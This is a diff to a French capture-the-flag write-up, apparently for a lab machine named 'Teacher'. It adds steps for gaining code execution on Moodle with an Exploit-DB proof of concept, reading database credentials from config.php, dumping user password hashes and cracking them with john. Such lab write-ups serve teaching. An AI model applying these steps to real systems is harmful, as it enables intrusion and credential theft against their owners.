@@ -33,5 +33,26 @@ $ cat 5.png
 ```
 ![Pic6](../img/teacher6.PNG?raw=true) </br>
 Nous avons a deviner le dernier caractère qu'il reste, après un certain temps, le couple Giovanni:Th4C00lTheacha# fonctionne pour s'authentifier.</br>
-Une fois connecté, nous pouvons suivre un POC pour obtenir une RCE :</br>
-https://blog.ripstech.com/2018/moodle-remote-code-execution/</br>
+Une fois connecté, nous pouvons suivre un POC pour obtenir une RCE :
+```bash
+$ searchsploit moodle
+$ locate 46551.php
+$ cp /usr/share/exploitdb/exploits/php/webapps/46551.php
+$ 
+```
+![Pic8](../img/teacher8.PNG?raw=true) </br>
+Nous sommes en tant que www-data. En regardant le fichier config.php de moodle, nous pouvons voir le couple identifiant:motdepasse de mariadb : root:Welkom1!</br>
+![Pic9](../img/teacher9.PNG?raw=true) </br>
+```bash
+$ mysql -u root -p 
+Mariadb > use moodle;
+Mariadb > select username, password from mdl_user;
+```
+![Pic10](../img/teacher10.PNG?raw=true) </br>
+Nous récupérons le hash de giovanni pour le cracker avec john :
+```bash
+$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
+```
+![Pic11](../img/teacher11.PNG?raw=true) </br>
+Nous pouvons alors nous identifier en tant que Giovanni et récuperer le user.txt :</br>
+![Pic12](../img/teacher12.PNG?raw=true) </br>
